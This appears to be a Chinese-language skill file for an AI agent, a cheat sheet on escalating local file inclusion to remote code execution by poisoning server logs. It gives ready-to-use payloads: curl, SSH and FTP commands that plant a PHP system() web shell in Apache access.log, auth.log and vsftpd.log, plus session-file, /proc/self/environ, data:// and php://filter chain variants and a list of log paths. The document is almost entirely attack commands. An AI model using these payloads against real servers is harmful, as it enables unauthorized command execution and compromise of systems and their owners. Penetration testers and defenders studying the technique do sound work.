---
name: 'log-poisoning-lfi-rce'
description: 'Log Poisoning LFI→RCE：access.log/ssh auth.log/php session污染→PHP代码执行。6种污染源+协议绕过。'
disable-model-invocation: true
metadata: { domain: web, tier: T2 }
---


## Log Poisoning — LFI→RCE

> 当 LFI 文件包含可用但无法直接写 webshell 时，通过污染日志文件使 PHP 包含执行。

### 污染源（按成功率排序）

#### 1. Apache access.log
```bash
# 发送恶意 User-Agent → 日志中有 PHP 代码 → LFI 包含
curl -H "User-Agent: <?php system(\$_GET['cmd']);?>" http://target/path
# LFI: /var/log/apache2/access.log 或 /var/log/httpd/access_log
# URL: http://target/page.php?file=/var/log/apache2/access.log&cmd=id
```text

#### 2. SSH auth.log
```bash
ssh '<?php system($_GET["cmd"]);?>'@target
# LFI: /var/log/auth.log
```text

#### 3. FTP 日志 (/var/log/vsftpd.log)
```bash
ftp target
Name: <?php system($_GET['cmd']);?>
# LFI: /var/log/vsftpd.log
```text

#### 4. PHP session 文件
```bash
# PHP sessions 存储在 /var/lib/php/sessions/sess_<PHPSESSID>
# 如果用户名可控 → 注册为 <?php system(...)?> → LFI session 文件
```text

#### 5. /proc/self/environ (如果可读)
```bash
curl -H "User-Agent: <?php system('id');?>" http://target/
# LFI: /proc/self/environ
```text

#### 6. 邮件日志
```bash
# 通过 SMTP 发送恶意邮件头 → /var/log/mail.log 含 PHP
```text

### 协议绕过（污染绕过 `<?php` 被过滤）
```bash
# 使用 data:// 协议直接写 PHP（不需要文件）
http://target/page.php?file=data://text/plain,<?php system('id');?>

# 使用 php://filter 链 (php_filter_chain_generator)
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
```text

### 常见日志路径
```text
/var/log/apache2/access.log       (Debian/Ubuntu Apache)
/var/log/httpd/access_log         (RHEL/CentOS)
/var/log/auth.log                 (Debian/Ubuntu)
/var/log/secure                   (RHEL/CentOS)
/var/log/vsftpd.log
/var/log/mail.log
/var/log/nginx/access.log
```text
